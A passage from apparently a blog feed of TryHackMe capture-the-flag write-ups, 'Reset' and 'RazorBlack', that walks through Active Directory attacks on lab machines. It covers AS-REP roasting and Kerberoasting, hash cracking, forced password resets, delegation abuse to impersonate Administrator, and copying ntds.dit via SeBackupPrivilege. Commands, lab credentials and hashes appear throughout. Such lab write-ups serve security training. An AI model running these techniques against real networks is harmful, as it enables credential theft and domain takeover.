**netexec** Tool .![Image](Pasted%20image%2020240229152840.png)_Domain Name : thm.corp_Lets access with Anonymous as username and now I can access IPC$ hidden share that indicates that I can enumerate users by bruteforcing RID's using this flag --rid-brute .![Image](Pasted%20image%2020240229153527.png)_Username enumeration through rid bruteforcing_I collected all the usernames into a file called **usernames.txt** ðŸ”½```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Reset]â””â”€$ cat a.txt| cut -d '\\' -f 2 | grep SidTypeUser | awk '{print $1}' > usernames.txt```{: .nolineno}I then tried **AS-REP ROASTING** with GetNPUser.py Tool from impackets ðŸ”»```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Reset]â””â”€$ /opt/Tools/impacket/examples/GetNPUsers.py -no-pass 'thm.corp/' -dc-ip 10.10.199.27 -request -usersfile usernames.txtImpacket v0.11.0 - Copyright 2023 Fortra[-] User Administrator does not have UF_DONT_REQUIRE_PREAUTH set[-] User Guest does not have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)[-] User HAYSTACK$ does not have UF_DONT_REQUIRE_PREAUTH set[-] User 3091731410SA does not have UF_DONT_REQUIRE_PREAUTH set$krb5asrep$23$ERNESTO_SILVA@THM.CORP:5354c47811d01c6b287e5218897de008$d81ec078729db3fb43e582f030f7100970f32c8be9b22b0e7d42255053b4f448b3bdbd3bbee9cac407eca74d110b43e1a1ddfc463155002401cfeb7b132589353b0a1696e32d29ef2a097ae04ebb57aa76b863c856dfbde7fb2828b06d1a3d1621bf53b166e96ccdbc716ed690e17518ed900c16bf065fb73f06f7d6495b2b246931263c0a6af2c1d8cd69027905088671216c16a2127b94da8df5c91c3e25ddeb232f5037c1f16a1ed21c7a5c0d1f90f8bef394b63600ca0881c79ff33a4308b4639e64dbcc7438b5805dae4e4dd650009fcd573a82933ae0ca933315fbcdb634240a37[-] User TRACY_CARVER does not have UF_DONT_REQUIRE_PREAUTH set[-] User SHAWNA_BRAY does not have UF_DONT_REQUIRE_PREAUTH set[-] User CECILE_WONG does not have UF_DONT_REQUIRE_PREAUTH set[-] User CYRUS_WHITEHEAD does not have UF_DONT_REQUIRE_PREAUTH set[-] User DEANNE_WASHINGTON does not have UF_DONT_REQUIRE_PREAUTH set[-] User ELLIOT_CHARLES does not have UF_DONT_REQUIRE_PREAUTH set[-] User MICHEL_ROBINSON does not have UF_DONT_REQUIRE_PREAUTH set[-] User MITCHELL_SHAW does not have UF_DONT_REQUIRE_PREAUTH set[-] User FANNY_ALLISON does not have UF_DONT_REQUIRE_PREAUTH set[-] User JULIANNE_HOWE does not have UF_DONT_REQUIRE_PREAUTH set[-] User ROSLYN_MATHIS does not have UF_DONT_REQUIRE_PREAUTH set[-] User DANIEL_CHRISTENSEN does not have UF_DONT_REQUIRE_PREAUTH set[-] User MARCELINO_BALLARD does not have UF_DONT_REQUIRE_PREAUTH set[-] User CRUZ_HALL does not have UF_DONT_REQUIRE_PREAUTH set[-] User HOWARD_PAGE does not have UF_DONT_REQUIRE_PREAUTH set[-] User STEWART_SANTANA does not have UF_DONT_REQUIRE_PREAUTH set[-] User LINDSAY_SCHULTZ does not have UF_DONT_REQUIRE_PREAUTH set$krb5asrep$23$TABATHA_BRITT@THM.CORP:8b3ee2c3d466bda1068ea5cb402dea44$7c1e5e744c7b1bdc2449243921d58053c036c5e62874dda92b4adbdfc94e41e265b4d11e759995e297577a50c64ab8ab03e8cc0a60be1c27b51a21da2eb5abb97b611dad16d6eeccf91d1fc6d6cf96f9cb38fe5eccf5f5d3b0608a9f7f4b14b3ffe6983a4871722c26673ec723e9011a07a6c3d4f9375d0c0c85f3398cf64b4b0805cd9d1e349800c04a94708ad140588da43c3a17426e21d8f76d6a6896a63b96658d5505f99397d6bbd89f0e7391aa85781ded6318f50d3fcd193f336c8129adbf845955f84c01c27344e9b19209cf3bf4567f582f3861f10c070e7a00eb86f329cab8[-] User RICO_PEARSON does not have UF_DONT_REQUIRE_PREAUTH set[-] User DARLA_WINTERS does not have UF_DONT_REQUIRE_PREAUTH set[-] User ANDY_BLACKWELL does not have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)[-] User CHERYL_MULLINS does not have UF_DONT_REQUIRE_PREAUTH set[-] User LETHA_MAYO does not have UF_DONT_REQUIRE_PREAUTH set[-] User HORACE_BOYLE does not have UF_DONT_REQUIRE_PREAUTH set[-] User CHRISTINA_MCCORMICK does not have UF_DONT_REQUIRE_PREAUTH set[-] User 3811465497SA does not have UF_DONT_REQUIRE_PREAUTH set[-] User MORGAN_SELLERS does not have UF_DONT_REQUIRE_PREAUTH set[-] User MARION_CLAY does not have UF_DONT_REQUIRE_PREAUTH set[-] User 3966486072SA does not have UF_DONT_REQUIRE_PREAUTH set[-] User TED_JACOBSON does not have UF_DONT_REQUIRE_PREAUTH set[-] User AUGUSTA_HAMILTON does not have UF_DONT_REQUIRE_PREAUTH set[-] User TREVOR_MELTON does not have UF_DONT_REQUIRE_PREAUTH set$krb5asrep$23$LEANN_LONG@THM.CORP:9dbd2c691039ac5c05d5f360bea948b6$5588c3aced92835c5e3537bee339a81eb3af492e27880e242c130b8d4b84686aca21ea54ba4b7e1233bfceed9c2e82907723a2202f6aa3d9d694ce235824b861185412737c0d1ed7c55902876503bf4df1105079100dacd956dd28040a2b6b6a007c629f5b75ff22020bfacb439d4d2d4691e13b87cef3475f9bc43becc99b5759b0b3a8bff6a36ef41eb476631561d1e5c058091a64c874a5d16b2f3af7326c9ee6e44cf17fb6263ae679e8d621dfb6d95a123181e78701525c1ab8fd7d83b3001c25a785339fd4e09af888ff87ce885652b934785854fe983464f60f506bc206e6e471[-] User RAQUEL_BENSON does not have UF_DONT_REQUIRE_PREAUTH set[-] User AUTOMATE does not have UF_DONT_REQUIRE_PREAUTH set```{: .nolineno}I got 3 users TGT tickets so lets crack these through John The Ripper Tool ðŸ”½```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Reset]â””â”€$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt Using default input encoding: UTF-8Loaded 3 password hashes with 3 different salts (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])Will run 2 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for status ($krb5asrep$23$TABATHA_BRITT@THM.CORP) 1g 0:00:00:55 DONE (2024-02-29 15:46) 0.01804g/s 258772p/s 621561c/s 621561C/s 0841079575..*Use the \"--show\" option to display all of the cracked passwords reliablySession completed. ```{: .nolineno}I only got the password cracked for user **TABATHA_BRITT** so lets also check for SPN tickets that could be get from this users credentials ðŸ”½![Image](Pasted%20image%2020240229155433.png)_Got a lot of SPN tickets lets crack these also in same manner_I got no users password got cracked so I checked the SMB Shares with that previous credentials and I access Data Share which contains 2 pdfs in which I got a credential of a user ->![Image](Pasted%20image%2020240229161355.png)_TABATHA_BRITT Shares_Lets access **Data** share with smbclient Tool.```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Reset]â””â”€$ smbclient //10.10.199.27/Data -U TABATHA_BRITTPassword for [WORKGROUP\\TABATHA_BRITT]:Try \"help\" to get a list of possible commands.smb: \\> ls . D 0 Thu Feb 29 16:03:59 2024 .. D 0 Thu Feb 29 16:03:59 2024 onboarding D 0 Thu Feb 29 16:05:05 2024\t\t7863807 blocks of size 4096. 3019472 blocks availablesmb: \\> cd onboarding\\smb: \\onboarding\\> ls . D 0 Thu Feb 29 16:05:35 2024 .. D 0 Thu Feb 29 16:05:35 2024 31z2jjau.krr.pdf A 4700896 Mon Jul 17 13:41:53 2023 nijgpbi2.5jx.txt A 521 Mon Aug 21 23:51:59 2023 tr0ecfbs.0wv.pdf A 3032659 Mon Jul 17 13:42:09 2023\t\t7863807 blocks of size 4096. 3019472 blocks availablesmb: \\onboarding\\> cd ..smb: \\> prompt offsmb: \\> recurse onsmb: \\> mget *getting file \\onboarding\\2v3t4m3a.m4z.pdf of size 3032659 as onboarding/2v3t4m3a.m4z.pdf (207.4 KiloBytes/sec) (average 207.4 KiloBytes/sec)getting file \\onboarding\\jn0hqwsd.nsz.pdf of size 4700896 as onboarding/jn0hqwsd.nsz.pdf (261.5 KiloBytes/sec) (average 237.2 KiloBytes/sec)NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \\onboarding\\mou3esxj.0w0.txtsmb: \\>```{: .nolineno}![Image](Pasted%20image%2020240229161235.png)_Pdf file on slide 7 I got creds_I started bloodhound as I collected the data from bloodhound-python ingestor Tool and got this path that leads me to Domain Admin ->![Image](Pasted%20image%2020240229225020.png)_BloodHound data to Domain Admin_I need to perform GenericAll on user SHAWNA_BRAY to move laterally into the network. ![Image](Pasted%20image%2020240229225223.png)_Path for GenericAll permission Abuse_I followed the kerberoast method that works similar to GetUserSPNs.py Tool from impacket.After that I have to perform Force Change Password that will change the password of the user SHAWNA_BRAY so I did it ->![Image](Pasted%20image%2020240229225512.png)_According to BloodHound Tool_I did it like this and verified it with netexec Tool ->```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Reset]â””â”€$ net rpc password \"SHAWNA_BRAY\" \"StrongShiv8\" -U \"thm.corp\"/\"TABATHA_BRITT\"%'marlboro(1985)' -S \"thm.corp\" ```{: .nolineno}![Image](Pasted%20image%2020240229225650.png)_I got access of SMB and RDP services_Lets make user SHAWNA_BRAY owned on BloodHound so moving on to user CRUZ_HALL I have to perform Force Change Password from user SHAWNA_BRAY so lets do it ->```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Reset]â””â”€$ net rpc password \"CRUZ_HALL\" \"StrongShiv8\" -U \"thm.corp\"/\"SHAWNA_BRAY\"%'StrongShiv8' -S \"thm.corp\"```{: .nolineno}![Image](Pasted%20image%2020240229230220.png)_Again got the same services permission_moving on laterally I got user DARLA_WINTERS which have GenericWrite permission that needs to be abused by user CRUZ_HALL .But the SPN tickets are not crackable so I tried the Force Change Password method and it worked ->```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Reset]â””â”€$ net rpc password \"DARLA_WINTERS\" \"StrongShiv8\" -U \"thm.corp\"/\"cruz_hall\"%'StrongShiv8' -S \"thm.corp\"```{: .nolineno}I got these services ->![Image](Pasted%20image%2020240301144750.png)_Services can be accessed_Now I have AllowedToDelegate permission that needs to be abused so lets see how according to bloodhound path ->![Image](Pasted%20image%2020240301144947.png)_getST.py Tool_Before that I need to generate the NTLM hash of the password of darla_winters ->![Image](Pasted%20image%2020240301154802.png)_NTLM hash of password of darla_winters_I will be using getST.py Tool from impacket that will impersonate as user Administrator and generate a TGT ticket ->```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Reset]â””â”€$ python3 /opt/Tools/impacket/examples/getST.py -spn 'cifs/haystack.thm.corp' -impersonate 'administrator' -altservice 'cifs' -hashes :3A9BB08C656640AC3DBF4F8038755264 'thm.corp/darla_winters'Impacket v0.11.0 - Copyright 2023 Fortra[-] CCache file is not found. Skipping...[*] Getting TGT for user[*] Impersonating administrator[*] Requesting S4U2self[*] Requesting S4U2Proxy[*] Changing service from cifs/haystack.thm.corp@THM.CORP to cifs/haystack.thm.corp@THM.CORP[*] Saving ticket in administrator@cifs_haystack.thm.corp@THM.CORP.ccache```{: .nolineno}Lets export this ticket into the environment variable **KRB5CCNAME** ->```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Reset]â””â”€$ export KRB5CCNAME=./Administrator@cifs_haystack.thm.corp@THM.CORP.ccache```{: .nolineno}Lets user impacket-wmiexec tool to get the shell with -no-pass flag also specify -k for importing ticket . ```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Reset]â””â”€$ impacket-wmiexec -k 'thm.corp/Administrator'@haystack.thm.corp -no-passImpacket v0.11.0 - Copyright 2023 Fortra[*] SMBv3.0 dialect used[!] Launching semi-interactive shell - Careful what you execute[!] Press help for extra shell commandsC:\\>whoamithm\\administratorC:\\>hostnameHayStackC:\\>cd C:\\Users\\AdministratorC:\\Users\\Administrator>tree /f /aFolder PATH listingVolume serial number is A8A4-C362C:.+---3D Objects+---Contacts+---Desktop| EC2 Feedback.website| EC2 Microsoft Windows Guide.website| root.txt| +---Documents+---Downloads+---Favorites| | Bing.url| | | \\---Links+---Links| Desktop.lnk| Downloads.lnk| +---Music+---Pictures+---Saved Games+---Searches\\---VideosC:\\Users\\Administrator>type Desktop\\root.txtTHM{FLAG_FLAG_FLAG_FLAG_FLAG_FLAG}C:\\Users\\Administrator>```{: .nolineno}I am Administrator Now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Razorblack", "url": "/posts/RazorBlack/", "categories": "TryHackMe", "tags": "ASREPRoast, Kerberosting, PrivEsc, NFS, Active Directory, GetNPUsers.py, GetUserSPNs.py, PSCredential, SeBackupPrivilege", "date": "2024-03-06 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Tryhackme/RazorBlack]â””â”€$ sudo nmap -sC -sV -T4 -p- -oN Nmap_Results.txt 10.10.69.53 -PnStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-0...", "content": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Tryhackme/RazorBlack]â””â”€$ sudo nmap -sC -sV -T4 -p- -oN Nmap_Results.txt 10.10.69.53 -PnStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-27 20:40 ISTNmap scan report for 10.10.69.53Host is up (0.21s latency).Not shown: 65507 closed tcp ports (reset)PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-02-27 15:25:04Z)111/tcp open rpcbind 2-4 (RPC #100000)| rpcinfo: | program version port/proto service| 100000 2,3,4 111/tcp rpcbind| 100000 2,3,4 111/tcp6 rpcbind| 100000 2,3,4 111/udp rpcbind| 100000 2,3,4 111/udp6 rpcbind| 100003 2,3 2049/udp nfs| 100003 2,3 2049/udp6 nfs| 100003 2,3,4 2049/tcp nfs| 100003 2,3,4 2049/tcp6 nfs| 100005 1,2,3 2049/tcp mountd| 100005 1,2,3 2049/tcp6 mountd| 100005 1,2,3 2049/udp mountd| 100005 1,2,3 2049/udp6 mountd| 100021 1,2,3,4 2049/tcp nlockmgr| 100021 1,2,3,4 2049/tcp6 nlockmgr| 100021 1,2,3,4 2049/udp nlockmgr| 100021 1,2,3,4 2049/udp6 nlockmgr| 100024 1 2049/tcp status| 100024 1 2049/tcp6 status| 100024 1 2049/udp status|_ 100024 1 2049/udp6 status135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped2049/tcp open nlockmgr 1-4 (RPC #100021)3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)3269/tcp open tcpwrapped3389/tcp open ms-wbt-server Microsoft Terminal Services| ssl-cert: Subject: commonName=HAVEN-DC.raz0rblack.thm| Not valid before: 2024-02-26T15:09:49|_Not valid after: 2024-08-27T15:09:49| rdp-ntlm-info: | Target_Name: RAZ0RBLACK| NetBIOS_Domain_Name: RAZ0RBLACK| NetBIOS_Computer_Name: HAVEN-DC| DNS_Domain_Name: raz0rblack.thm| DNS_Computer_Name: HAVEN-DC.raz0rblack.thm| DNS_Tree_Name: raz0rblack.thm| Product_Version: 10.0.17763|_ System_Time: 2024-02-27T15:25:55+00:00|_ssl-date: 2024-02-27T15:26:04+00:00; 0s from scanner time.5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found9389/tcp open mc-nmf .NET Message Framing47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Not Found|_http-server-header: Microsoft-HTTPAPI/2.049664/tcp open msrpc Microsoft Windows RPC49665/tcp open msrpc Microsoft Windows RPC49667/tcp open msrpc Microsoft Windows RPC49668/tcp open msrpc Microsoft Windows RPC49672/tcp open msrpc Microsoft Windows RPC49675/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.049676/tcp open msrpc Microsoft Windows RPC49679/tcp open msrpc Microsoft Windows RPC49694/tcp open msrpc Microsoft Windows RPC49705/tcp open msrpc Microsoft Windows RPC49712/tcp open msrpc Microsoft Windows RPCService Info: Host: HAVEN-DC; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode: | 3:1:1: |_ Message signing enabled and required| smb2-time: | date: 2024-02-27T15:25:59|_ start_date: N/A```{: .nolineno}## SMB Enumeration â¤µï¸I check with no creds through `netexec` Tool and I got no access but I got the domain name like this ->![Image](Pasted%20image%2020240227204858.png)_Domain Name : raz0rblack.thm_And I checked port scan where I noticed NFS Shares are enabled so lets access that .## NFS Enumeration â¤µï¸Lets acces NFS Shares with showmount command ðŸ”»```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Tryhackme/RazorBlack]â””â”€$ showmount -e 10.10.69.53 Export list for 10.10.69.53:/users (everyone)```{: .nolineno}I got a share named as users with access permissions to everyone. So lets access that ->```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Tryhackme/RazorBlack]â””â”€$ mkdir mnt â”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Tryhackme/RazorBlack]â””â”€$ sudo mount -v -t nfs -o vers=3,proto=tcp,nolock 10.10.69.53:/users mnt/ [sudo] password for kali: mount.nfs: timeout set for Tue Feb 27 20:46:14 2024mount.nfs: trying text-based options 'vers=3,proto=tcp,nolock,addr=10.10.69.53'mount.nfs: prog 100003, trying vers=3, prot=6mount.nfs: trying 10.10.69.53 prog 100003 vers 3 prot TCP port 2049mount.nfs: prog 100005, trying vers=3, prot=6mount.nfs: trying 10.10.69.53 prog 100005 vers 3 prot TCP port 2049```{: .nolineno}I have to be root to access that so lets see what inside of it ->```bashâ”Œâ”€â”€(rootã‰¿kali)-[/home/â€¦/Downloads/Tryhackme/RazorBlack/mnt]â””â”€# ls -altotal 17drwx------ 2 4294967294 4294967294 64 Feb 27 2021 .drwxr-xr-x 3 kali kali 4096 Feb 27 20:43 ..-rwx------ 1 4294967294 4294967294 9861 Feb 25 2021 employee_status.xlsx-rwx------ 1 4294967294 4294967294 80 Feb 26 2021 sbradley.txt```{: .nolineno}I then copied it to my system and I got a flag from `sbrandley.txt` file and I got some users from `employee_status.xlsx` file ->![Image](Pasted%20image%2020240227205522.png)_Users information_I performed user name mash program with these names like this ->```python#!/usr/bin/env pythonimport sysimport os.pathif __name__ == \"__main__\": if len(sys.argv) != 2: print(\"usage: {} names.txt\".format((sys.argv[0]))) sys.exit(0) if not os.path.exists(sys.argv[1]): print(\"{} not found\".format(sys.argv[1])) sys.exit(0) for line in open(sys.argv[1]): name = ''.join([c for c in line if c == \" \" or c.isalpha()]) tokens = name.lower().split() # skip empty lines if len(tokens) ```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Tryhackme/RazorBlack]â””â”€$ python3 namemash.py users.txt > usernames.txt```{: .nolineno}I then performed **kerbrute userenum** with this usernames.txt files and I got some hits like this ðŸ”½![Image](Pasted%20image%2020240227210236.png)_kerbrute Tool from impackets_I then stored all 3 usernames in `kerbrute_users.txt` file and lets perform AS-REP-ROASTING on these usernames , Lets see if I could get any ones TGT tickets.```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Tryhackme/RazorBlack]â””â”€$ /opt/Tools/impacket/examples/GetNPUsers.py -no-pass 'raz0rblack.thm/' -dc-ip 10.10.69.53 -request -usersfile kerbrute_users.txtImpacket v0.11.0 - Copyright 2023 Fortra[-] User lvetrova does not have UF_DONT_REQUIRE_PREAUTH set$krb5asrep$23$twilliams@RAZ0RBLACK.THM:71ce9c8e792de43cac6adc8d22f3eaaf$0dbfd672df8f5262bb05d31c699d3d3962b6bc5ef2b416c63346eea4f7b47e6a0dc9a80850f959666d5a9919d0fb6032315e61629875923ca5f04876c4938f1ebd83559198306a1b9bd1cb151ad4397deed3171dc99ce3130721e3c78d968e13179b6d20ca874a8baced9b13431138c97cc12bbda88eabc7a7489e5549b13fea9497260da11eaa4c416f0d819a916708761985e28a07a42aad9133dd7cdaf4f5a57b707978189387956aa906aaa777ccae2d3cf07fc80c95e3432dd475d041a8f3360d231164df2628f355ab885ed84a496eeb867d40a3d499eda7423b0847c8db05ef............13f93d607f[-] User sbradley does not have UF_DONT_REQUIRE_PREAUTH set```{: .nolineno}Lets crack this hash with John The Ripper Tool ->```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Tryhackme/RazorBlack]â””â”€$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt Using default input encoding: UTF-8Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])Will run 2 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for status ($krb5asrep$23$twilliams@RAZ0RBLACK.THM) 1g 0:00:00:12 DONE (2024-02-27 21:06) 0.08038g/s 339385p/s 339385c/s 339385C/s Use the \"--show\" option to display all of the cracked passwords reliablySession completed. ```{: .nolineno}Lets see the privileges of this user ðŸ”½![Image](Pasted%20image%2020240227210939.png)_Got access to SMB Shares_I also tried to access any SPN ticket with the credentials of twilliams and I got it ->![Image](Pasted%20image%2020240227211208.png)_Got SPN ticket for user xyan1d3_Lets crack this hash with previous way ðŸ”»```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Tryhackme/RazorBlack]â””â”€$ john --wordlist=/usr/share/wordlists/rockyou.txt SPNticket.hashUsing default input encoding: UTF-8Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])Will run 2 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for status (?) 1g 0:00:00:19 DONE (2024-02-27 21:13) 0.05115g/s 453597p/s 453597c/s 453597C/s Use the \"--show\" option to display all of the cracked passwords reliablySession completed.```{: .nolineno}I now have the credentials of 2 user twilliams and xyan1d3.I got this privileges from user xyan1d3 user ->![Image](Pasted%20image%2020240227211956.png)_I got winrm permissions_Lets have a **winrm** session .### WINRM SHELL â©![Image](Pasted%20image%2020240227212249.png)_WINRM Session_```powershell*Evil-WinRM* PS C:\\Users\\xyan1d3> cat xyan1d3.xml System.Management.Automation.PSCredential System.Object System.Management.Automation.PSCredential Nope your flag is not here 01000000d08c9ddf0115d1118c7a00c04fc297eb010000006bc3424112257a48aa7937963e14ed790000000002000000000003660000c000000010000000f098beb903e1a489eed98b779f3c70b80000000004800000a000000010000000e59705c44a560ce4c53e837d111bb39970000000feda9c94c6cd1687ffded5f438c59b080362e7e2fe0d9be8d2ab96ec7895303d167d5b38ce255ac6c01d7ac510ef662e48c53d3c89645053599c00d9e8a15598e8109d23a91a8663f886de1ba405806944f3f7e7df84091af0c73a4effac97ad05a3d6822cdeb06d4f415ba19587574f1400000051021e80fd5264d9730df52d2567cd7285726da2 *Evil-WinRM* PS C:\\Users\\xyan1d3> ```{: .nolineno}Lets try to crack this password ->Here are 3 Steps to do so ðŸ˜€Step 1 â©Collect the credentials in a variable like this ðŸ”»```powershell*Evil-WinRM* PS C:\\Users\\xyan1d3> $user=\"Nope your flag is not here\"*Evil-WinRM* PS C:\\Users\\xyan1d3> $pass=\"01000000d08c9ddf0115d1118c7a00c04fc297eb010000006bc3424112257a48aa7937963e14ed790000000002000000000003660000c000000010000000f098beb903e1a489eed98b779f3c70b80000000004800000a000000010000000e59705c44a560ce4c53e837d111bb39970000000feda9c94c6cd1687ffded5f438c59b080362e7e2fe0d9be8d2ab96ec7895303d167d5b38ce255ac6c01d7ac510ef662e48c53d3c89645053599c00d9e8a15598e8109d23a91a8663f886de1ba405806944f3f7e7df84091af0c73a4effac97ad05a3d6822cdeb06d4f415ba19587574f1400000051021e80fd5264d9730df52d2567cd7285726da2\" | ConvertTo-SecureString```{: .nolineno}Step 2 â©Now create the PSCredential Object passing the variables.```powershell*Evil-WinRM* PS C:\\Users\\xyan1d3> $cred = New-Object System.Management.Automation.PSCredential($user, $pass)```{: .nolineno}Step 3 â©Finally extract clear text information from the PSCredential Object.```powershell*Evil-WinRM* PS C:\\Users\\xyan1d3> $cred.GetNetworkCredential() | flUserName : Nope your flag is not herePassword : LOL here it is -> THM{FLAG_FLAG_FLAG_FLAG}SecurePassword : System.Security.SecureStringDomain :```{: .nolineno}Now I checked the privileges or permissions on this shell and I got this ->```powershell*Evil-WinRM* PS C:\\Users\\xyan1d3\\Documents> whoamiraz0rblack\\xyan1d3*Evil-WinRM* PS C:\\Users\\xyan1d3\\Documents> whoami /allUSER INFORMATION----------------User Name SID================== =====================================raz0rblack\\xyan1d3 S-1-5-21-3403444377-2687699443-13012745-1106GROUP INFORMATION-----------------Group Name Type SID Attributes========================================== ================ ============ ===========================================Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Backup Operators Alias S-1-5-32-551 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Remote Management Users Alias S-1-5-32-580 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled groupMandatory Label\\High Mandatory Level Label S-1-16-12288PRIVILEGES INFORMATION----------------------Privilege Name Description State============================= ============================== SeMachineAccountPrivilege Add workstations to domain EnabledSeBackupPrivilege Back up files and directories EnabledSeRestorePrivilege Restore files and directories EnabledSeShutdownPrivilege Shut down the system EnabledSeChangeNotifyPrivilege Bypass traverse checking EnabledSeIncreaseWorkingSetPrivilege Increase a process working set EnabledUSER CLAIMS INFORMATION-----------------------User claims unknown.Kerberos support for Dynamic Access Control on this device has been disabled.*Evil-WinRM* PS C:\\Users\\xyan1d3\\Documents>```{: .nolineno}So I have SeBackupPrivilege Enable lets exploit that with this reference ->https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960I created a back_script.txt file like this ->```textset verbose onXset metadata C:\\Windows\\Temp\\meta.cabXset context clientaccessibleXset context persistentXbegin backupXadd volume C: alias cdriveXcreateXexpose %cdrive% E:Xend backupX```{: .nolineno}Now I executed it with **diskshadow** command like this ðŸ”½```powershell*Evil-WinRM* PS C:\\Windows\\Temp> diskshadow /s C:\\Users\\xyan1d3\\Documents\\back_script.txtMicrosoft DiskShadow version 1.0Copyright (C) 2013 Microsoft CorporationOn computer: HAVEN-DC, 2/27/2024 8:58:06 AM-> set verbose on-> set metadata C:\\Windows\\Temp\\meta.cab-> set context clientaccessible-> set context persistent-> begin backup-> add volume C: alias cdrive-> create[...]```{: .nolineno}Now I have to copy the ntds.dit file.```powershell*Evil-WinRM* PS C:\\Windows\\Temp> cd E:\\Windows\\ntds*Evil-WinRM* PS E:\\Windows\\ntds> dir Directory: E:\\Windows\\ntdsMode LastWriteTime Length Name---- ------------- ------ -----a---- 2/27/2024 8:59 AM 8192 edb.chk-a---- 2/27/2024 8:59 AM 10485760 edb.log-a---- 2/23/2021 7:00 AM 10485760 edb00001.log-a---- 2/23/2021 6:59 AM 10485760 edbres00001.jrs-a---- 2/23/2021 6:59 AM 10485760 edbres00002.jrs-a---- 2/27/2024 8:59 AM 16777216 ntds.dit-a---- 2/27/2024 8:59 AM 16384 ntds.jfm-a---- 2/27/2024 8:13 AM 434176 temp.edb*Evil-WinRM* PS E:\\Windows\\ntds> cd ..\\Temp*Evil-WinRM* PS E:\\Windows\\Temp>```{: .nolineno}I will be using `robocopy` command like this ðŸ”»```powershell*Evil-WinRM* PS E:\\Windows\\Temp> robocopy /b E:\\Windows\\ntds . ntds.dit------------------------------------------------------------------------------- ROBOCOPY :: Robust File Copy for Windows------------------------------------------------------------------------------- Started : Tuesday, February 27, 2024 9:01:07 AM Source : E:\\Windows\\ntds\\ Dest : E:\\Windows\\Temp\\ Files : ntds.dit Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30------------------------------------------------------------------------------\t 1\tE:\\Windows\\ntds\\2024/02/27 09:01:07 ERROR 19 (0x00000013) Changing File Attributes E:\\Windows\\Temp\\The media is write protected.```{: .nolineno}It did not work so I tried with method 2 of reference link and downloaded `SeBackupPrivilegeCmdLets.dll` and `SeBackupPrivilegeUtils.dll` files from https://github.com/giuliano108/SeBackupPrivilege that will enable the copy function.```powershell*Evil-WinRM* PS C:\\Users\\xyan1d3\\Documents> Import-Module 